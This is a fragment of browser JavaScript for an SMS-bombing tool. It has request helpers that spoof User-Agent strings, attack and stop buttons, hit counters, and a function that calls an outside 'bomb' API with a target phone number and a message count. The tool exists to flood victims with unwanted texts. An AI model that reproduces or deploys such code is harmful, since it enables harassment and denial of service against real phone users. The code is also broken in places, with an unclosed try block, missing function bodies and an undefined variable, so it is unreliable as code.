    try {
        const res = await fetch(url, {

            body: JSON.stringify(payload),
            credentials: 'omit'
        });
        return res.ok;
    } catch { return false; }
};

const getReq = async (url, headers = {}) => {
    try {
        const res = await fetch(url, {
            method: 'GET',
            headers: { 'User-Agent': getUA(), ...headers },
            credentials: 'omit'
        });
        return res.ok;
    } catch { return false; }
};

const formPost = async (url, bodyStr) => {
    try {
        const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': getUA() },
            body: bodyStr,
            credentials: 'omit'
        });
        return res.ok;

};

/* ---------- NEW LOGIC ---------- */
let isActive = false;
let total = 0, success = 0, fail = 0;

const attackBtn = document.getElementById('attackBtn');
const stopBtn   = document.getElementById('stopBtn');

    totalSpan.innerText = total;
    successSpan.innerText = success;
    failSpan.innerText = fail;
}

/* Call the external API */
async function callBombAPI(phone, count){
    const url = `https://boom-sms.onrender.com/bomb?phone=${phone}&count=${count}`;
    try{
        const res = await fetch(url, {method:'GET', headers:{'User-Agent':getUA()}, credentials:'omit'});

        updateStats();
        statusSpan.innerHTML = data.message || 'Done';
        return true;
    }catch(e){
        statusSpan.innerHTML = '❌ '+e.message;
        return false;
    }
}

/* Stop the ongoing attack (if any) */
async function stopBomb(){
